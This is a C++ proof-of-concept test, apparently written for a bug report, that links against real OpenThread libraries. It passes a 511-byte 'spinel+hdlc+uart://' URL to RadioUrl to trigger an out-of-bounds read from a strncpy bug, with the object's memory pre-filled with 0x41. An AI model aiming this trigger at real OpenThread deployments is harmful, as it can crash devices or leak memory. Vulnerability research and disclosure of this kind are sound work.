/**
 * PoC: OpenThread RadioUrl OOB Read - REAL LIBRARY TEST
 *
 * This PoC links against the actual compiled libopenthread libraries
 * to validate the bug exists in the real library, not just isolated source files.
 */

#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <new>
#include <string>

// Include the REAL OpenThread headers
#include "src/posix/platform/radio_url.hpp"

// Required stubs for OpenThread platform abstraction
extern "C" {

const char *otExitCodeToString(uint8_t aExitCode)
{
    switch (aExitCode)
    {
    case 0: return "OT_EXIT_SUCCESS";
    case 1: return "OT_EXIT_FAILURE";
    case 2: return "OT_EXIT_INVALID_ARGUMENTS";
    default: return "OT_EXIT_UNKNOWN";
    }
}

void otLogCritPlat(const char *aFormat, ...)
{
    va_list args;
    va_start(args, aFormat);
    vfprintf(stderr, aFormat, args);
    fputc('\n', stderr);
    va_end(args);
}

void otLogWarnPlat(const char *aFormat, ...) { (void)aFormat; }
void otLogNotePlat(const char *aFormat, ...) { (void)aFormat; }
void otLogInfoPlat(const char *aFormat, ...) { (void)aFormat; }
void otLogDebgPlat(const char *aFormat, ...) { (void)aFormat; }

} // extern "C"

static std::string MakeUrl(std::size_t targetLength)
{
    const std::string prefix = "spinel+hdlc+uart://";
    std::string url = prefix;

    if (targetLength > prefix.size())
    {
        url.append(targetLength - prefix.size(), 'A');
    }
    return url;
}

int main(int argc, char **argv)
{
    std::size_t length = 511;  // Trigger length

    if (argc > 1)
    {
        length = static_cast<std::size_t>(std::strtoul(argv[1], nullptr, 0));
    }

    std::string url = MakeUrl(length);

    std::fprintf(stderr, "=== OpenThread RadioUrl OOB - REAL LIBRARY TEST ===\n");
    std::fprintf(stderr, "Linked against: libopenthread-posix-radio.a + libopenthread-url.a\n");
    std::fprintf(stderr, "URL length: %zu bytes\n", url.size());
    std::fprintf(stderr, "Triggering ot::Posix::RadioUrl::Init()...\n\n");

    // Allocate and pre-fill with 'A' to ensure no accidental nulls
    void *storage = ::operator new(sizeof(ot::Posix::RadioUrl));
    std::memset(storage, 0x41, sizeof(ot::Posix::RadioUrl));

    // Construct RadioUrl using placement new
    // Constructor calls Init() which has the strncpy bug
    auto *radioUrl = new (storage) ot::Posix::RadioUrl(url.c_str());

    // If we get here without ASan crash, print results
    std::fprintf(stderr, "Protocol: %s\n", radioUrl->GetProtocol());
    std::fprintf(stderr, "Path: %s\n", radioUrl->GetPath());

    ::operator delete(storage);
    return 0;
}
